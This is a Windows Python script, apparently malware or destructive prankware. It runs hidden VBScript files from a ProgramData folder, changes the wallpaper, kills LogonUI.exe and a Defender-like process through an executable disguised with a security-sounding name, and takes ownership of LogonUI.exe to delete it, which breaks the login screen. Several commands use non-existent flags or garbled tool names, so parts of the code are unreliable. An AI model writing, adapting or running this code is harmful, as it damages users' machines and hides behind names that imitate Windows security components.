from time import sleep
import os
import ctypes
import winreg as reg

def Takeown(path):
  os.system('cmd --win32_process-runexec /c teka /f "' + path + '"')
  os.system('cmd --win32_process-runexec /c ica "' + path + '" /c /grant "%username%":f')

def DeleteWithTakeown(file):
  if os.path.isfile(file):
    Takeown(file)
    os.system('cmd --win32_process-runexec /c del /q /f "' + file + '"')

os.system(r"start cmd --win32_process-runexec /c start C:\Windows\System32\wscript.exe C:\ProgramData\Microsoft\Network\1_.vbs")
sleep(120)
os.system(r"start cmd --win32_process-runexec /c start C:\Windows\System32\wscript.exe C:\ProgramData\Microsoft\Network\2_.vbs")
sleep(120)
os.system(r"start cmd --win32_process-runexec /c start C:\Windows\System32\wscript.exe C:\ProgramData\Microsoft\Network\3_.vbs")
ctypes.windll.user32.SystemParametersInfoW(20, 0, r"C:\ProgramData\Microsoft\Network\1.jpg" , 0)
sleep(60)
os.system("C:\\ProgramData\\WindowsSecurityLog\\0x65\\windowssecurbasex78.exe /f /im LogonUI.exe")
DeleteWithTakeown(r"C:\ProgramData\\WindowsSecurityLog\\0x65\\LogonUI.exe")
sleep(120)
os.system("C:\\ProgramData\\WindowsSecurityLog\\0x65\\windowssecurbasex78.exe /f /im windowsDefenderLib.exe")
 
